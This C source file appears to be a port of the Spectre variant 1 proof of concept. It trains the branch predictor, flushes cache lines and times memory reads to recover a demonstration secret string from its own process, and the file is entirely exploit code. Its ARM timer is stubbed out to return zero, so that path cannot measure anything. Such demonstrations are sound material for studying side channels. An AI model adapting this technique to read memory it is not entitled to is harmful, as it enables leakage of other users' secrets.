#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <assert.h>

#define VERISON "2021-09-15 12:09"

int MAX_TRIES = 10;
unsigned int CACHE_HIT_THRESHOLD = 30;

/********************************************************************
Victim code.
********************************************************************/
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16};
uint8_t unused2[64];
uint8_t array2[256 * 512];

char *secret = "The Magic Words are Squeamish Ossifrage.";

uint8_t temp = 0; /* Used so compiler won't optimize out victim_function() */

void victim_function(size_t x)
{
	if (x < array1_size)
	{
		temp &= array2[array1[x] * 512];
	}
}

/********************************************************************
Analysis code
********************************************************************/
inline __attribute__((always_inline)) void flush_cache(uint64_t addr)
// void flush_cache(uint64_t addr)
{
	#ifdef X86
	_mm_clflush(addr);
	#else
	__asm__ volatile(
		"dc civac, %0"
		:
		: "r"(addr)
		: "memory");
	#endif
}

inline __attribute((always_inline)) void barrier()
{
	#ifdef X86
	_mm_mfence();
	#else
	__asm__ volatile(
		"dmb sy"
	);
	#endif
}

#ifndef X86
uint64_t read_cycles()
{
	uint32_t result = 0;

	// Read PMCCNTR
	__asm__ volatile(
		// "mrs %0, pmccntr_el0"
		// : "=r"(result));
		"nop");

	return result;
}
#endif

/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
{
	static int results[256];
	int tries, i, j, k, mix_i;
	unsigned int junk = 0;
	size_t training_x, x;
	register uint64_t time1, time2;
	volatile uint8_t *addr;

	/* Reset score sheet */
	for (i = 0; i < 256; i++)
		results[i] = 0;

	/* For each try: attempt to leak to array2 */
	for (tries = MAX_TRIES; tries > 0; tries--)
	{
		/* Flush array2[256*(0..255)] from cache */
		for (i = 0; i < 256; i++)
		{
			flush_cache(&array2[i * 512]);
		}

		/* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
		training_x = tries % array1_size;
		for (j = 29; j >= 0; j--)
		{
			flush_cache(&array1_size);
			// Delay
			#ifdef X86
			for (volatile int z = 0; z < 100; z++) { }
			#endif
			barrier();

			/* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
			/* Avoid jumps in case those tip off the branch predictor */
			x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
			x = (x | (x >> 16));		 /* Set x=-1 if j%6=0, else x=0 */
			x = training_x ^ (x & (malicious_x ^ training_x));

			/* Call the victim! */
			victim_function(x);
		}

		/**
		 * Time reads.
		 * Order is lightly mixed up to prevent stride prediction --
		 * which causes segmentation faults.
		 * 
		 * Maybe this makes the speculative window smaller?
		 * 
		 */
		for (i = 0; i < 256; i++)
		{
            #ifdef MIX
			mix_i = ((i * 167) + 13) & 255;
            #else
            mix_i = i;
            #endif
			addr = &array2[mix_i * 512];
			#ifdef X86
			time1 = __rdtscp(&junk);
			junk = *addr;
			time2 = __rdtscp(&junk) - time1;
			#else
			barrier();
			time1 = read_cycles();
			junk = *addr;				   /* MEMORY ACCESS TO TIME */
			barrier();
			time2 = read_cycles() - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
			#endif

			#ifdef DEBUG
			if (i % 64 == 0) printf("\n");
			printf("%d ", time2);
			#endif
			if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
			{
				results[mix_i]++; /* cache hit - add +1 to score for this value */
			}
		}

		#ifdef DEBUG
		printf("\n");
		for (i = 0; i < 4; i++) {
			for (j = 0; j < 64; j++) {
				printf("%d ", results[i * 64 + j]);
			}
			printf("\n");
		}
		#endif

		/* Locate highest & second-highest */
		j = k = -1;
		for (i = 0; i < 256; i++)
		{
			if (j < 0 || results[i] >= results[j])
			{
				k = j;
				j = i;
			}
			else if (k < 0 || results[i] >= results[k])
			{
				k = i;
			}
		}
	}

	results[0] ^= junk; /* use junk so code above won't get optimized out*/
	value[0] = (uint8_t)j;
	score[0] = results[j];
	value[1] = (uint8_t)k;
	score[1] = results[k];
}

int main(int argc, char **argv)
{
	printf("Last updated %s\n", VERISON);
	printf("Putting '%s' in memory\n", secret);

	/* Default for malicious_x is the secret string address */
	size_t malicious_x = (size_t)(secret - (char *)array1);
	uint8_t value[2];
	int score[2];
	int len = strlen(secret);
	char recovered[len + 1];
	char value_normalised[2];
	int i = 0;

	memset(recovered, 0x00, len + 1);

	if (argc == 4)
	{
		sscanf(argv[1], "%d", &MAX_TRIES);
		sscanf(argv[2], "%d", &CACHE_HIT_THRESHOLD);
		sscanf(argv[3], "%d", &len);
	}
	printf("MAX_TRIES=%d CACHE_HIT_THRESHOLD=%d len=%d\n", MAX_TRIES, CACHE_HIT_THRESHOLD, len);

	for (size_t i = 0; i < sizeof(array2); i++)
		array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */

	printf("Reading %d bytes:\n", len);
	while (--len >= 0)
	{
		printf("Reading@malicious_x=%p ", (void *)malicious_x);
		readMemoryByte(malicious_x++, value, score);

		printf("0x%02X='%c' score=%d ", value[0],
			   (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);

		if (score[1] > 0)
			printf("(second best: 0x%02X='%c' score=%d)", value[1],
				   (value[1] > 31 && value[1] < 127 ? value[1] : '?'),
				   score[1]);

		value_normalised[0] = (value[0] > 31 && value[0] < 127) ? value[0] : '?';
		value_normalised[1] = (value[1] > 31 && value[1] < 127) ? value[1] : '?';
		if (value_normalised[0] == '?' && value_normalised[1] != '?')
		{
			recovered[i] = value_normalised[1];
		}
		else
		{
			recovered[i] = value_normalised[0];
		}
		printf("\n");
		i++;
	}

	printf("Original secret: %s\n", secret);
	printf("Recovered      : %s\n", recovered);

	return (0);
}
